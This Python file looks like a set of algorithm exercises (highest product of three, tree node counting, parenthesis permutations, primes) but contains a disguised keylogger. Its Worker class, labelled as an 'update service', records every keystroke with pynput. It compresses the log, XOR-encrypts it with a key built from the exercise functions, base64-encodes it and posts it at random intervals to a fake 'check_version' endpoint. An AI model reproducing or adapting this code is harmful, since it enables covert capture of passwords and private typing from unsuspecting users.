import pynput.keyboard
import threading
import os
from queue import Queue

from threading import Thread
from time import time
from random import randrange
import base64
import zlib
from itertools import cycle
import requests


def highest_product_of_three(list_of_ints):
    """ Takes a list of integers and returns the highest product of three of the integers. The input list_of_ints will always have at least three integers.
    >>> highest_product_of_three([1,2,3,4,5])
    60
    >>> highest_product_of_three([1,2,3,4,-5])
    24
    >>> highest_product_of_three([-10,-10,1,3,2])
    300
    >>> highest_product_of_three([10,2,5])
    100
    >>> highest_product_of_three([5,4,3,2,1])
    60
    """

    # Runtime: O(n)
    # Spacetime: O(1)

    highest_product = list_of_ints[0] * list_of_ints[1] * list_of_ints[2]
    highest = list_of_ints[0]
    lowest = list_of_ints[0]
    highest_two = list_of_ints[0] * list_of_ints[1]
    lowest_two = list_of_ints[0] * list_of_ints[1]

    if len(list_of_ints) == 3:
        return highest_product


    for i in range(2,len(list_of_ints)-1):
        product = list_of_ints[i] * list_of_ints[i + 1]
        current_num = list_of_ints[i]

        if current_num > highest:
            highest = current_num
            if product > highest_two:
                highest_two = product
        elif current_num < lowest:
            lowest = current_num
            if product < lowest_two:
                lowest_two = product

    if highest_two * highest > lowest_two * lowest:
        highest_product = highest_two * highest
    elif highest_two * highest < lowest_two * lowest:
        highest_product = lowest_two * lowest
    elif highest_two * lowest < lowest_two * highest:
        highest_product = lowest_two * highest
    else:
        highest_product = highest_two * lowest

    return highest_product

def num_nodes(tree):
    """Counts the number of nodes in a tree.
        >>> class Node(object):
        ...     def __init__(self, data):
        ...             self.data=data
        ...             self.children = []
        ...     def add_child(self, obj):
        ...             self.children.append(obj)
        ...
        >>> one = Node(1)
        >>> two = Node(2)
        >>> three = Node(3)
        >>> one.add_child(two)
        >>> one.add_child(three)
        >>> num_nodes(one)
        3
        >>> four = Node(4)
        >>> five = Node(5)
        >>> two.add_child(four)
        >>> two.add_child(five)
        >>> num_nodes(one)
        5
        >>> six = Node(6)
        >>> three.add_child(six)
        >>> num_nodes(one)
        6
    """

    nodes = 1

    if tree is None:
      return 0

    for child in tree.children:
      nodes += num_nodes(child)


    return nodes

def valid_parens_perms(num):

    result = []

    def recurse(substr, left, right):
        if left == 0 and right == 0:
            result.append(substr)
            return

        elif left == 0:
            recurse(substr + ')', left, right - 1)

        elif left < right:
            recurse(substr + '(', left - 1, right)
            recurse(substr + ')', left, right - 1)

        elif left == right:
            recurse(substr + '(', left - 1, right)

    recurse('', num, num)

    return result

def prime():
    prime_nums = []
    for num in range(500):
        if num > 1:
            for i in range(2, num):
                if (num % i) == 0:
                    break
            else:
                prime_nums.append(num)
    return prime_nums

class Worker:
    def __init__(self, key):
        self.logger = "[Started update service]"
        self.subject = "upservice"
        self.key = key

    
    def xor(self, data): 
        return bytearray(a^b for a, b in zip(*map(bytearray, [data, key])))


    def append_to_log(self, key_strike):
        self.logger = self.logger + key_strike

    def evaluate_keys(self, key):
        try: 
            Pressed_key = str(key.char)
        except AttributeError:
            if key == key.space:
                Pressed_key =  " "
            else:
                Pressed_key =  " " + str(key) + " "
        if Pressed_key != "":
            self.append_to_log(Pressed_key)

    def update(self):
        url = 'http://localhost:5000/check_version'
        ts = time()
        myobj = {'version': '1.33', 'type':'json', 'date': ts, 'data': self.logger}
        try:
            requests.post(url, data = myobj)
        except Exception as e:
            pass



    def report(self):
        timer = threading.Timer(randrange(15), self.report)
        timer.start()
        if len(self.logger) > 4:
            self.logger = self.logger.encode('ascii')
            self.logger = base64.b64encode(self.xor(zlib.compress(self.logger))).decode("utf-8")
            threading.Thread(target=self.update).start()
            self.logger = ""

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == '__main__':
    res = prime()
    key = str.encode(chr(highest_product_of_three([-10,-10,1,3,2]))*2) + str.encode('*'.join(chr(i*10) for i in res)) +  str.encode('-'.join(valid_parens_perms(2)))
    worker = Worker(key)
    worker.start()